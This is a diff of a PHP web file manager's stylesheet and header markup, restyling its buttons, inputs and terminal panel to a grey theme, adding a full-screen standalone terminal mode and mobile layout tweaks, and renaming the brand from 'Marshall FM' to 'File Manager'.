 input[type=checkbox]:hover,input[type=radio]:hover{border-color:var(--fieldb-h);background:var(--fieldh)}
-input[type=checkbox]:checked,input[type=radio]:checked{background:var(--indigo);border-color:var(--indigo);box-shadow:0 0 0 3px rgba(99,102,241,.18)}
+input[type=checkbox]:checked,input[type=radio]:checked{background:var(--check);border-color:var(--check-border);box-shadow:0 0 0 3px rgba(125,129,132,.1)}
 input[type=checkbox]:checked::after{content:'';position:absolute;left:3px;top:.5px;width:5px;height:8px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
 input[type=radio]:checked::after{content:'';position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%)}
-input[type=checkbox]:focus,input[type=radio]:focus{outline:none;box-shadow:0 0 0 3px rgba(99,102,241,.25)}
+input[type=checkbox]:focus,input[type=radio]:focus{outline:none;box-shadow:0 0 0 3px rgba(125,129,132,.16)}
 .cc{width:32px}.rck{width:15px;height:15px;cursor:pointer;appearance:none;-webkit-appearance:none;background:var(--field);border:1.5px solid var(--fieldb);border-radius:4px;display:inline-block;position:relative;flex-shrink:0;transition:background .15s,border-color .15s}
-.rck:hover{border-color:rgba(255,255,255,.3)}.rck:checked{background:var(--indigo);border-color:var(--indigo)}
+.rck:hover{border-color:rgba(160,160,160,.28)}.rck:checked{background:var(--check);border-color:var(--check-border)}
 .rck:checked::after{content:'';position:absolute;left:3px;top:.5px;width:5px;height:8px;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
 .nc{display:flex;align-items:center;gap:9px;cursor:pointer;min-width:0}
 .ib{width:29px;height:29px;flex-shrink:0;border-radius:8px;display:flex;align-items:center;justify-content:center;transition:transform .18s var(--spring)}
 .ft tbody tr:hover .ib{transform:scale(1.08)}.ib .ti{width:17px;height:17px}
 .nm{min-width:0}
 .tag-dot{margin-right:6px;vertical-align:middle}
-.nt{color:var(--t1);font-weight:500;font-size:13px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:240px;text-decoration:none;transition:color .15s}
+.nt{color:var(--t1);font-weight:var(--fw-medium);font-size:13px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:240px;text-decoration:none;transition:color .15s}
 a.nt:hover{color:var(--link)}
 .eb{display:inline-block;margin-top:1px;font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:700;letter-spacing:.4px;text-transform:uppercase;padding:1px 5px;border-radius:4px;background:var(--raised);color:var(--t3)}
 .mono{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--t2);padding:2px 7px;border-radius:5px;background:var(--raised);white-space:nowrap}
@@ -4826,10 +5780,10 @@ a.nt:hover{color:var(--link)}
 .gv{display:grid;grid-template-columns:repeat(auto-fill,minmax(112px,1fr));gap:6px;padding:2px}
 .gi{background:var(--surf);border:1px solid var(--border);border-radius:var(--r);padding:9px 8px 8px;display:flex;flex-direction:column;align-items:center;gap:5px;cursor:pointer;transition:background .15s,border-color .15s,transform .18s var(--spring);position:relative;animation:rIn .25s var(--spring) both}
 .gi:hover{background:var(--hov);border-color:var(--border2);transform:translateY(-2px)}.gi:active{transform:scale(.97)}
-.gi.selected{border-color:var(--indigo);background:rgba(99,102,241,.07)}
+.gi.selected{border-color:var(--indigo);background:rgba(133,137,140,.07)}
 .gi-ic{width:38px;height:38px;border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .gi-ic .ti{width:22px;height:22px}.gi-th{width:38px;height:38px;border-radius:8px;object-fit:cover;display:block}
-.gi-n{font-size:11.5px;font-weight:500;color:var(--t1);text-align:center;word-break:break-word;max-width:100px;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}
+.gi-n{font-size:11.5px;font-weight:var(--fw-medium);color:var(--t1);text-align:center;word-break:break-word;max-width:100px;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}
 .gi-m{font-size:10px;color:var(--t3);font-family:'JetBrains Mono',monospace}
 .gi-ck{position:absolute;top:6px;left:6px;opacity:0;transition:opacity .15s}
 .gi:hover .gi-ck,.gi.selected .gi-ck{opacity:1}
@@ -4838,43 +5792,51 @@ a.nt:hover{color:var(--link)}
 .filter-bar{display:flex;align-items:center;gap:5px;padding:0 0 8px;flex-wrap:nowrap;overflow-x:auto;-webkit-overflow-scrolling:touch}
 .filter-bar::-webkit-scrollbar{display:none}
 .fb-btn{display:inline-flex;align-items:center;gap:4px;padding:4px 10px;border-radius:20px;font-size:11.5px;font-weight:600;border:1px solid var(--border);background:transparent;color:var(--t2);cursor:pointer;white-space:nowrap;transition:all .15s;-webkit-user-select:none;user-select:none}
-.fb-btn:hover{background:var(--hov);color:var(--t1);border-color:var(--border2)}.fb-btn.active{background:rgba(99,102,241,.12);color:var(--link);border-color:rgba(99,102,241,.3)}
+.fb-btn:hover{background:var(--hov);color:var(--t1);border-color:var(--border2)}.fb-btn.active{background:rgba(133,137,140,.12);color:var(--link);border-color:rgba(133,137,140,.3)}
 
 /* ══ BULK BAR ══ */
 .bulk-bar{position:absolute;left:50%;bottom:14px;transform:translate(-50%,130%);background:var(--raised);border:1px solid var(--border2);border-radius:13px;padding:7px 9px;display:flex;align-items:center;gap:6px;box-shadow:0 16px 48px rgba(0,0,0,.6);transition:transform .28s var(--spring);z-index:80}
 .bulk-bar.show{transform:translate(-50%,0)}.bkc{font-size:12px;color:var(--t1);font-weight:700;padding:0 5px;white-space:nowrap}
 
 /* ══ STATUS BAR ══ */
-.bar{grid-area:bar;background:linear-gradient(90deg,var(--indigo2),#6366f1);display:flex;align-items:center;padding:0 12px;gap:16px;overflow:hidden}
+ .bar{grid-area:bar;background:linear-gradient(90deg,var(--indigo2),#606467);display:flex;align-items:center;padding:0 12px;gap:16px;overflow:hidden}
 .bs{display:flex;align-items:center;gap:4px;font-size:10.5px;font-family:'JetBrains Mono',monospace;color:rgba(255,255,255,.7);white-space:nowrap}
 .bs svg{width:11px;height:11px;stroke:rgba(255,255,255,.8);fill:none;stroke-width:2;stroke-linecap:round}.bs strong{color:#fff;font-weight:700}
 .bs-click{cursor:pointer;transition:opacity .15s}.bs-click:hover{opacity:.72;text-decoration:underline}
 .br{margin-left:auto;display:flex;gap:16px;align-items:center}
 
 /* ══ BUTTONS ══ */
-.btn{display:inline-flex;align-items:center;gap:5px;padding:7px 13px;border-radius:var(--r);font-family:'Inter',system-ui,sans-serif;font-size:12.5px;font-weight:600;border:none;cursor:pointer;text-decoration:none;white-space:nowrap;line-height:1;transition:background .15s,transform .18s var(--spring),box-shadow .15s;-webkit-user-select:none;user-select:none}
+.btn{display:inline-flex;align-items:center;gap:5px;padding:7px 13px;border-radius:var(--r);font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;font-size:12.5px;font-weight:var(--fw-medium);border:none;cursor:pointer;text-decoration:none;white-space:nowrap;line-height:1;transition:background .15s,transform .18s var(--spring),box-shadow .15s;-webkit-user-select:none;user-select:none}
 .btn svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}.btn:active{transform:scale(.93)!important}
 .btn-sm{padding:5px 11px;font-size:12px;border-radius:8px}.btn-sm svg{width:12px;height:12px}
 .btn-icon{padding:6px;border-radius:8px}.btn-icon svg{width:14px;height:14px}
 .btn-xs{padding:4px 8px;font-size:11.5px;border-radius:7px;gap:3px}.btn-xs svg{width:12px;height:12px}
-.btn-p{background:var(--indigo);color:#fff;box-shadow:0 2px 8px rgba(99,102,241,.3)}.btn-p:hover{background:#7c3aed;transform:translateY(-1px);box-shadow:0 5px 16px rgba(124,58,237,.4)}
-.btn-g{background:transparent;color:var(--t2);border:1px solid var(--border)}.btn-g:hover{background:var(--hov);color:var(--t1);border-color:var(--border2);transform:translateY(-1px)}
+/* Compact text actions keep the top bar and file toolbar aligned with the
+   smaller action buttons used throughout the manager. Icon-only controls
+   intentionally keep their 32px touch target. */
+.topbar .btn-sm{height:29px;padding:4px 9px;font-size:11.5px;border-radius:7px}
+.topbar .btn-sm svg{width:12px;height:12px;stroke-width:2}
+.topbar .tb-right .btn-icon{width:29px;min-width:29px;height:29px;padding:5px;border-radius:7px}
+.topbar .tb-right .btn-icon svg{width:12px;height:12px}
+.toolbar .tb-row .btn-sm,.toolbar .tb-row .upl-lbl{padding-left:9px;padding-right:9px;font-size:11.5px;border-radius:7px}
+.toolbar .tb-row .btn-sm svg,.toolbar .tb-row .upl-lbl svg{width:12px;height:12px}
+ .btn-p{background:#C9C6C2;color:#101010;box-shadow:0 2px 8px rgba(201,198,194,.13)}.btn-p:hover{background:#E1DDD8;transform:translateY(-1px);box-shadow:0 5px 16px rgba(201,198,194,.2)}
+ .btn-g{background:#454744;color:#C9C6C2;border:1px solid #606467}.btn-g:hover{background:#606467;color:#101010;border-color:#C9C6C2;transform:translateY(-1px)}
 .btn-green{background:rgba(34,197,94,.1);color:#86efac;border:1px solid rgba(34,197,94,.2)}.btn-green:hover{background:rgba(34,197,94,.17);transform:translateY(-1px)}
 .btn-amb{background:rgba(245,158,11,.1);color:#fcd34d;border:1px solid rgba(245,158,11,.2)}.btn-amb:hover{background:rgba(245,158,11,.17);transform:translateY(-1px)}
 .btn-red{background:rgba(239,68,68,.1);color:#fca5a5;border:1px solid rgba(239,68,68,.18)}.btn-red:hover{background:rgba(239,68,68,.17);transform:translateY(-1px)}
-.btn-blue{background:rgba(59,130,246,.1);color:#93c5fd;border:1px solid rgba(59,130,246,.2)}.btn-blue:hover{background:rgba(59,130,246,.17);transform:translateY(-1px)}
-.btn-purp{background:rgba(139,92,246,.1);color:#c4b5fd;border:1px solid rgba(139,92,246,.2)}.btn-purp:hover{background:rgba(139,92,246,.17);transform:translateY(-1px)}
+.btn-blue,.btn-purp{background:rgba(80,81,77,.28);color:#A6A7A6;border:1px solid rgba(112,116,119,.36)}.btn-blue:hover,.btn-purp:hover{background:rgba(112,116,119,.42);color:#D8D4D0;transform:translateY(-1px)}
 .btn-star{background:rgba(245,158,11,.12);color:#fcd34d;border:1px solid rgba(245,158,11,.25)}.btn-star:hover{background:rgba(245,158,11,.2);transform:translateY(-1px)}
 
 /* ══ INPUTS ══ */
-.inp{background:var(--field);border:1px solid var(--border);color:var(--t1);border-radius:var(--r);padding:7px 11px;font-size:12.5px;font-family:'Inter',system-ui,sans-serif;outline:none;min-width:0;transition:border-color .18s,box-shadow .18s}
+.inp{background:var(--field);border:1px solid var(--border);color:var(--t1);border-radius:var(--r);padding:7px 11px;font-size:12.5px;font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;outline:none;min-width:0;transition:border-color .18s,box-shadow .18s}
 .inp::placeholder{color:var(--t3)}
 select.inp{color-scheme:dark}
 :root[data-theme="light"] select.inp{color-scheme:light}
-.inp::placeholder{color:var(--t3)}.inp:focus{border-color:rgba(99,102,241,.55);box-shadow:0 0 0 3px rgba(99,102,241,.1)}
-.upl-lbl{display:inline-flex;align-items:center;gap:6px;padding:7px 13px;border-radius:var(--r);font-size:12.5px;font-weight:600;font-family:'Inter',sans-serif;cursor:pointer;white-space:nowrap;border:1.5px dashed rgba(99,102,241,.3);color:var(--t2);background:rgba(99,102,241,.04);transition:border-color .18s,color .18s,background .18s,transform .18s var(--spring)}
+.inp::placeholder{color:var(--t3)}.inp:focus{border-color:rgba(133,137,140,.6);box-shadow:0 0 0 3px rgba(133,137,140,.16)}
+.upl-lbl{display:inline-flex;align-items:center;gap:6px;padding:7px 13px;border-radius:var(--r);font-size:12.5px;font-weight:var(--fw-medium);font-family:'Inter',ui-sans-serif,system-ui,sans-serif;cursor:pointer;white-space:nowrap;border:1.5px dashed rgba(133,137,140,.45);color:var(--t2);background:rgba(133,137,140,.06);transition:border-color .18s,color .18s,background .18s,transform .18s var(--spring)}
 .upl-lbl svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round}
-.upl-lbl:hover{border-color:var(--indigo);color:var(--link);background:rgba(99,102,241,.08);transform:translateY(-1px)}.upl-lbl:active{transform:scale(.97)}
+.upl-lbl:hover{border-color:var(--indigo);color:var(--link);background:rgba(133,137,140,.12);transform:translateY(-1px)}.upl-lbl:active{transform:scale(.97)}
 input[type=file]{display:none}
 
 /* ══ OVERLAY / MODAL ══ */
@@ -4887,7 +5849,7 @@ input[type=file]{display:none}
 .perm-t{border-collapse:collapse;font-size:12.5px}.perm-t th{text-align:center;color:var(--t3);font-weight:600;font-size:10.5px;text-transform:uppercase;letter-spacing:.5px;padding:4px 8px}.perm-t td{text-align:center;padding:6px 8px;color:var(--t2)}.perm-t td:first-child{text-align:left;font-weight:600;color:var(--t1)}.perm-t input[type=checkbox]{width:16px;height:16px;cursor:pointer}
 @keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
 .mod-head{display:flex;align-items:center;gap:9px;padding:10px 14px;border-bottom:1px solid var(--border);background:var(--raised);flex-shrink:0}
-.mod-icon{width:24px;height:24px;border-radius:7px;display:flex;align-items:center;justify-content:center;background:rgba(99,102,241,.15);flex-shrink:0}
+.mod-icon{width:24px;height:24px;border-radius:7px;display:flex;align-items:center;justify-content:center;background:rgba(133,137,140,.15);flex-shrink:0}
 .mod-icon svg{width:13px;height:13px;stroke:var(--link);fill:none;stroke-width:2;stroke-linecap:round}
 .mod-title{font-size:13px;font-weight:700;color:var(--t1);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .mod-body{overflow:auto;flex:1;padding:13px}
@@ -4948,44 +5910,71 @@ input[type=file]{display:none}
 .sh-btn.sh-amb:hover{background:rgba(245,158,11,.08);color:#fcd34d;border-color:rgba(245,158,11,.2)}
 .sh-btn.sh-purp:hover{background:rgba(139,92,246,.08);color:#c4b5fd;border-color:rgba(139,92,246,.2)}
 
-/* ══ TERMINAL (real xterm style) ══ */
-.term-win{background:#0c0c0c;border-radius:var(--rlg);overflow:hidden;display:flex;flex-direction:column;height:460px;box-shadow:0 0 0 1px rgba(255,255,255,.08)}
-.term-titlebar{display:flex;align-items:center;padding:10px 14px;background:#1a1a1a;border-bottom:1px solid #2a2a2a;gap:8px;flex-shrink:0}
-.term-dots{display:flex;gap:6px}
-.term-dot{width:12px;height:12px;border-radius:50%}
-.term-dot.r{background:#ff5f57}.term-dot.y{background:#febc2e}.term-dot.g{background:#28c840}
-.term-title{flex:1;text-align:center;font-family:'JetBrains Mono',monospace;font-size:11px;color:#666;user-select:none}
-.term-out{flex:1;overflow-y:auto;padding:12px 16px;font-family:'JetBrains Mono',monospace;font-size:12.5px;line-height:1.75;color:#cccccc;background:#0c0c0c;white-space:pre-wrap;word-break:break-word}
-.term-out::-webkit-scrollbar{width:4px}.term-out::-webkit-scrollbar-thumb{background:#333;border-radius:4px}
-.term-line{display:block}
-.term-line.cmd-line{color:#8be9fd}
-.term-line.ok-line{color:#cccccc}
-.term-line.err-line{color:#ff5555}
-.term-line.info-line{color:#6272a4;font-style:italic}
-.term-line.success-line{color:#50fa7b}
-.term-prompt-str{color:#50fa7b}
-.term-at{color:#bd93f9}
-.term-path{color:#8be9fd}
-.term-dollar{color:#f8f8f2}
-.term-row{display:flex;align-items:center;padding:8px 14px;background:#111;border-top:1px solid #222;gap:10px;flex-shrink:0}
-.term-ps{font-family:'JetBrains Mono',monospace;font-size:12.5px;white-space:nowrap;flex-shrink:0}
-.term-inp{flex:1;background:transparent;border:none;outline:none;font-family:'JetBrains Mono',monospace;font-size:12.5px;color:#f8f8f2;caret-color:#50fa7b}
-.term-cursor{display:inline-block;width:7px;height:14px;background:#50fa7b;animation:blink 1s step-end infinite;vertical-align:text-bottom;margin-left:1px}
+/* ══ TERMINAL (the supplied DNT Shell layout, full-screen and borderless) ══ */
+.term-ov{padding:0;background:#1c1c1c;backdrop-filter:none;align-items:stretch;justify-content:stretch}
+.term-ov.open{display:block}
+.term-win{position:fixed;inset:0;width:100vw;height:100dvh;background:#1c1c1c;color:#b3b3b3;border:0;border-radius:0;box-shadow:none;overflow-y:auto;overflow-x:hidden;display:block;padding-bottom:35px;box-sizing:border-box;font-family:monospace;font-size:0;line-height:0}
+.term-out{display:block;overflow:visible;padding:8px 0 0;font-family:monospace;font-size:0;line-height:0;color:#b3b3b3;background:#1c1c1c;white-space:pre-wrap;word-break:break-word}
+.term-out::-webkit-scrollbar{width:5px}.term-out::-webkit-scrollbar-thumb{background:#4a4a4a;border-radius:4px}
+.term-line{display:block;font-size:14px;line-height:1.25;min-height:0;margin:0 0 0 2px;white-space:pre-wrap;word-break:break-word}
+.term-line.cmd-line{color:#7db8ba}
+.term-line.ok-line{color:#b3b3b3}
+.term-line.err-line{color:#e88080}
+.term-line.info-line{color:#7db8ba;font-style:normal}
+.term-line.success-line{color:#5ec97e}
+.term-prompt-str{color:#5ec97e}
+.term-at{color:#d4d454}
+.term-path{color:#7db8ba}
+.term-dollar{color:#b3b3b3}
+.term-prompt-wrap{position:relative;display:block;background:#1c1c1c;font-size:14px;line-height:normal}
+.term-row{display:flex;align-items:center;padding:0;margin:0 0 -2px 2px;background:#1c1c1c;gap:0;font-size:14px;line-height:normal}
+.term-ps{font-family:monospace;font-size:14px;line-height:normal;white-space:nowrap;flex-shrink:0}
+.term-inp{flex:0 1 auto;width:.1ch;max-width:calc(100vw - 220px);background:transparent;border:none;outline:none;font-family:monospace;font-size:14px;line-height:1;color:#b3b3b3;caret-color:transparent;padding:0;margin:0;resize:none;letter-spacing:0}
+.term-inp::placeholder{color:#636363}
+.term-cursor{display:inline-block;width:8px;height:14px;background:#b3b3b3;animation:blink 1s step-end infinite;vertical-align:-2px;margin-left:1px;flex-shrink:0}
 @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-.term-suggest{position:absolute;background:#1e1e2e;border:1px solid #313244;border-radius:6px;padding:4px 0;z-index:9;min-width:180px;box-shadow:0 8px 24px rgba(0,0,0,.6)}
-.term-sug-item{padding:5px 12px;font-family:'JetBrains Mono',monospace;font-size:12px;color:#cdd6f4;cursor:pointer;transition:background .1s}
-.term-sug-item:hover,.term-sug-item.active{background:#313244}
+.term-suggest{position:absolute;background:#252525;border:1px solid #555;border-radius:4px;padding:4px 0;z-index:9;min-width:180px;box-shadow:0 8px 24px rgba(0,0,0,.6)}
+.term-sug-item{padding:5px 12px;font-family:monospace;font-size:12px;color:#d4d454;cursor:pointer;transition:background .1s}
+.term-sug-item:hover,.term-sug-item.active{background:#3b3b3b}
+.term-footer{position:fixed;left:0;right:0;bottom:0;z-index:1000;display:flex;align-items:center;min-height:25px;height:25px;background:#131313;border:1px solid #636363;padding-left:5px;box-sizing:border-box;overflow:hidden;font-family:monospace;font-size:10px;line-height:1;color:#fff}
+.term-footer-item{display:flex;align-items:center;margin-right:8px;white-space:nowrap;font-size:10px!important;line-height:1;flex-shrink:0}
+.term-footer-label{display:inline-block;color:#d4d454;font-size:10px!important;line-height:1;font-weight:700;margin:0 3px}
+.term-footer-value{display:inline-block;color:#fff;font-size:10px!important;line-height:1;margin-right:3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:150px}
+.term-footer-sep{width:2px;height:60%;background:#7db8ba;margin:0 5px;flex-shrink:0}
+.term-footer-graph{width:50px;height:12px;background:#000;border:.5px solid #646464;overflow:hidden;display:inline-block;vertical-align:middle}
+.term-footer-graph canvas{width:100%;height:100%;display:block}
+.term-win,.term-win *{font-family:'TerminalTMT',monospace!important;font-variant-ligatures:none}
+.term-footer-spacer{flex:1}
+.term-footer-hide-sm,.term-footer-hide-md,.term-footer-hide-lg{display:none}
+@media (min-width:768px){
+  .term-footer-hide-sm{display:flex}
+  .term-footer-sep.term-footer-hide-sm{display:block}
+}
+@media (min-width:1024px){
+  .term-footer-hide-md{display:flex}
+  .term-footer-sep.term-footer-hide-md{display:block}
+}
+@media (min-width:1280px){
+  .term-footer-hide-lg{display:flex}
+  .term-footer-sep.term-footer-hide-lg{display:block}
+}
+/* A terminal opened from the manager gets its own browser tab/window. */
+body.term-standalone{background:#1c1c1c;overflow:hidden}
+body.term-standalone .shell{display:none!important}
+body.term-standalone .mod-ov:not(.term-ov){display:none!important}
+body.term-standalone .term-ov{display:block!important;position:fixed;inset:0}
+body.term-standalone .term-win{position:fixed;inset:0}
 
 /* ══ EDITOR ══ */
 .ed-card{background:var(--surf);border:1px solid var(--border);border-radius:var(--rlg);overflow:hidden;animation:fadeUp .3s var(--spring) both}
 .ed-head{display:flex;align-items:center;flex-wrap:wrap;gap:8px;padding:10px 14px;background:var(--raised);border-bottom:1px solid var(--border)}
 .ed-fname{display:flex;align-items:center;gap:7px;font-family:'JetBrains Mono',monospace;font-size:12.5px;font-weight:600;color:var(--t1)}
 .ed-fname svg{width:14px;height:14px;stroke:var(--indigo);fill:none;stroke-width:2;stroke-linecap:round}
-.ed-meta{font-size:11px;color:var(--t3);font-family:'JetBrains Mono',monospace;margin-left:auto}
+.ed-meta{font-size:11px;font-weight:var(--fw-muted);color:var(--t3);font-family:'JetBrains Mono',monospace;margin-left:auto}
 textarea.code{display:block;width:100%;min-height:520px;background:#070a10;color:#cdd6f4;border:none;padding:18px 20px;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.85;resize:vertical;outline:none;tab-size:4;transition:box-shadow .2s}
-textarea.code:focus{box-shadow:inset 0 0 0 1.5px rgba(99,102,241,.45)}
+textarea.code:focus{box-shadow:inset 0 0 0 1.5px rgba(133,137,140,.45)}
 .ed-foot{padding:9px 14px;background:var(--raised);border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:6px}
-.ed-hint{font-size:11px;color:var(--t3);font-family:'JetBrains Mono',monospace}
+.ed-hint{font-size:11px;font-weight:var(--fw-muted);color:var(--t3);font-family:'JetBrains Mono',monospace}
 kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--t2)}
 
 /* ══ HASH / INFO / LOG ══ */
@@ -4997,7 +5986,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 .info-c{background:var(--raised);border:1px solid var(--border);border-radius:var(--r);padding:12px}
 .info-cl{font-size:9.5px;font-weight:700;text-transform:uppercase;letter-spacing:.7px;color:var(--t3);margin-bottom:4px}
 .info-cv{font-family:'JetBrains Mono',monospace;font-size:13.5px;font-weight:700;color:var(--t1)}
-.info-cs{font-size:10.5px;color:var(--t2);margin-top:2px}
+.info-cs{font-size:10.5px;font-weight:var(--fw-muted);color:var(--t2);margin-top:2px}
 .ext-wrap{display:flex;flex-wrap:wrap;gap:4px;margin-top:8px}
 .ext-tag{background:var(--raised);border:1px solid var(--border);border-radius:5px;padding:2px 7px;font-size:10.5px;font-family:'JetBrains Mono',monospace;color:var(--t2)}
 .log-t{width:100%;border-collapse:collapse}
@@ -5006,13 +5995,13 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 .log-t tr:last-child td{border-bottom:none}.log-t tbody tr:hover td{background:var(--hov)}
 .la{display:inline-block;padding:2px 7px;border-radius:5px;font-size:10px;font-weight:700;font-family:'JetBrains Mono',monospace;text-transform:uppercase;letter-spacing:.4px}
 .la.upload,.la.create{background:rgba(34,197,94,.1);color:#86efac}.la.trash,.la.bulk_delete{background:rgba(239,68,68,.1);color:#fca5a5}
-.la.rename,.la.duplicate,.la.batch_rename{background:rgba(245,158,11,.1);color:#fcd34d}.la.edit,.la.mkdir{background:rgba(99,102,241,.1);color:#a5b4fc}
+.la.rename,.la.duplicate,.la.batch_rename{background:rgba(245,158,11,.1);color:#fcd34d}.la.edit,.la.mkdir{background:rgba(133,137,140,.1);color:#C7C8C8}
 .la.terminal{background:rgba(139,92,246,.1);color:#c4b5fd}.la.restore,.la.zip_extract,.la.tar_extract{background:rgba(6,182,212,.1);color:#67e8f9}
 
 /* ══ EMPTY ══ */
 .empty{text-align:center;padding:56px 20px}
 .empty svg{width:44px;height:44px;stroke:var(--t3);fill:none;stroke-width:1.5;stroke-linecap:round;margin:0 auto 12px;display:block}
-.empty p{color:var(--t3);font-size:14px;font-weight:500}
+.empty p{color:var(--t3);font-size:14px;font-weight:var(--fw-muted)}
 
 /* ══ SCROLLBAR ══ */
 ::-webkit-scrollbar{width:5px;height:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:6px}::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,.14)}
@@ -5032,12 +6021,23 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 @media(max-width:768px){
   :root{--sw:0px;--th:54px;--bh:28px}
   .shell{grid-template:"tb" var(--th) "main" 1fr "bar" var(--bh) / 1fr}
-  .topbar{padding:0 10px;gap:6px}
-  .brand{width:auto;flex:0 0 auto}
+  .topbar{padding:0 max(8px,env(safe-area-inset-left)) 0 max(8px,env(safe-area-inset-right));gap:4px;min-height:var(--th)}
+  .brand{width:auto;max-width:130px;flex:0 1 auto;overflow:hidden}
   .bc{display:none}.menu-btn{display:flex!important;min-width:40px;min-height:40px}
   .tb-right .dv{display:none}
   .tb-right .btn-sm span{display:none}
-  .tb-right .btn-icon{min-width:40px;min-height:40px}
+  .tb-right > span{display:none}
+  .tb-right{gap:4px;min-width:0;margin-left:auto}
+  /* Keep only compact, evenly sized touch targets on mobile. The text
+     labels disappear, while the icons remain easy to tap and never compete
+     with the menu button or logo for horizontal space. */
+  .topbar .tb-right .btn,
+  .topbar .tb-right .btn-sm,
+  .topbar .tb-right .btn-icon{width:32px;min-width:32px;height:32px;min-height:32px;padding:5px;border-radius:8px}
+  .topbar .tb-right .btn svg,
+  .topbar .tb-right .btn-sm svg,
+  .topbar .tb-right .btn-icon svg{width:12px;height:12px}
+  .tb-right .top-fav,.tb-right #viewBtn,.tb-right .top-up{display:none}
   #usersBtn{display:none}
   .tsearch{display:none}
   .sidebar{position:fixed;top:var(--th);left:0;width:min(88vw,300px);height:calc(100dvh - var(--th));z-index:160;transform:translateX(-100%);transition:transform .32s var(--spring);border-right:1px solid var(--border2);box-shadow:16px 0 60px rgba(0,0,0,.8);padding-bottom:env(safe-area-inset-bottom)}
@@ -5051,7 +6051,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   .nc{gap:9px}
   /* Hide table actions, use sheet instead */
   .acts{display:none}
-  .bar{padding:0 10px;gap:10px}.bs{font-size:10px}.br{gap:10px}
+  .bar{padding:0 10px;gap:10px;overflow-x:auto;overflow-y:hidden;white-space:nowrap}.bs{font-size:10px;flex-shrink:0}.br{gap:10px;flex-shrink:0}
   .bulk-bar{width:calc(100% - 20px);left:10px;right:10px;transform:translate(0,130%);flex-wrap:wrap;padding:10px;gap:6px}
   .bulk-bar.show{transform:translate(0,0)}.bulk-bar .btn{min-height:40px}
   .mod,.prev-box{max-height:90dvh}
@@ -5060,21 +6060,33 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   .gv{grid-template-columns:repeat(auto-fill,minmax(92px,1fr))}
   .toolbar{padding:8px 10px;gap:6px}
   /* Show 2-col on mobile toolbar */
-  .tb-row{display:flex;align-items:center;gap:6px;width:100%}
-  .tb-row .upl-lbl{flex:0 0 auto}.tb-row .inp{flex:1;min-height:40px;padding:9px 11px}.tb-row .btn-sm{flex-shrink:0;min-height:40px}
+  .toolbar .tb-row{display:flex;align-items:center;flex-wrap:wrap!important;gap:6px;width:100%}
+  .toolbar .tb-row .upl-lbl,.toolbar .tb-row .btn-sm{height:40px;min-height:40px}
+  .toolbar .tb-row .upl-lbl{flex:0 0 auto}.toolbar .tb-row .inp{flex:1;min-height:40px;height:40px;padding:9px 11px}.toolbar .tb-row .btn-sm{flex-shrink:0}
 }
 @media(max-width:430px){
   :root{--th:50px}
+  .topbar{padding-left:max(8px,env(safe-area-inset-left));padding-right:max(8px,env(safe-area-inset-right));gap:3px}
+  .menu-btn{min-width:36px!important;width:36px;min-height:36px!important;height:36px!important}
+  .brand-icon,.brand-icon img{width:29px;height:29px}
+  .tb-right{gap:3px}
+  .topbar .tb-right .btn,
+  .topbar .tb-right .btn-sm,
+  .topbar .tb-right .btn-icon{width:30px;min-width:30px;height:30px;min-height:30px;padding:4px}
   .brand-name{display:none}
   .ib{width:30px;height:30px;border-radius:8px}.ib .ti{width:17px;height:17px}
   .eb{display:none}
   .col-size,.col-size-td{display:none}
   .bs:nth-child(n+4):not(:last-child){display:none}
   .gv{grid-template-columns:repeat(auto-fill,minmax(80px,1fr))}
+  .toolbar{padding:7px 8px}
+  .toolbar .tb-row{gap:5px}
+  .toolbar .tb-row .inp{min-width:0}
+  .content{padding:8px}
 }
 </style>
 </head>
-<body>
+<body class="<?=$terminalStandalone?'term-standalone':''?>">
 <div class="shell">
 
 <!-- TOPBAR -->
@@ -5083,8 +6095,8 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
     <svg viewBox="0 0 24 24"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
   </button>
   <a href="?dir=<?=urlencode(__DIR__)?>" class="brand">
-    <div class="brand-icon"><img src="https://c.top4top.io/p_3882y9kyr0.png" alt="Marshall FM"></div>
-    <span class="brand-name">Marshall FM</span>
+     <div class="brand-icon"><img src="https://github.com/orgezeo/marshal-file-manager/blob/main/images/icons/mfm.png?raw=true" alt="File Manager"></div>
+    <span class="brand-name">File Manager</span>
   </a>
   <div class="dv"></div>
   <nav class="bc" aria-label="Breadcrumb">
